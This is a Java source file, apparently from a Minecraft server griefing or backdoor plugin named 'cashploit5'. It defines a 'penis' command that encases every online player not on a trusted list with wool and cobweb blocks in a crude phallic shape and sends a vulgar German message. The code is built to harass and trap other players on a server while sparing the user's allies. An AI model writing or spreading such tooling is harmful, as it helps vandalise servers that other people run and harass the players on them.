package de.cashploit5.v1_8_8.command;

import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.entity.Player;

import de.cashploit5.Main;

public class PenisCommand extends Command {

	public PenisCommand() {
		super("penis");
	}

	@SuppressWarnings("deprecation")
	@Override
	public void onCommand(Player p, Command command, String[] args) {
		for (Player all : Bukkit.getOnlinePlayers()) {
			if (!TrustCommand.getTrustedPlayers().contains(all.getUniqueId().toString())) {
				all.getLocation().getBlock().setType(Material.WOOL);
				all.getLocation().clone().add(0, 0, 1).getBlock().setType(Material.WOOL);
				all.getLocation().clone().add(0, 0, -1).getBlock().setType(Material.WOOL);
				all.getLocation().clone().add(0, 1, 0).getBlock().setType(Material.WOOL);
				all.getLocation().clone().add(0, 2, 0).getBlock().setType(Material.WOOL);
				all.getLocation().clone().add(0, 3, 0).getBlock().setType(Material.WOOL);
				all.getLocation().clone().add(0, 3, 0).getBlock().setData((byte) 2);
				all.getLocation().clone().add(0, 4, 0).getBlock().setType(Material.WEB);
				all.getLocation().clone().add(0, 5, 0).getBlock().setType(Material.WEB);
				all.getLocation().clone().add(0, 6, 1).getBlock().setType(Material.WEB);
				all.getLocation().clone().add(1, 7, 1).getBlock().setType(Material.WEB);
				all.getLocation().clone().add(1, 8, 0).getBlock().setType(Material.WEB);
				all.getLocation().clone().add(1, 9, -1).getBlock().setType(Material.WEB);
			}
		}
		Main.sendMessage(p, "§aSCHWANZ!");
	}

}
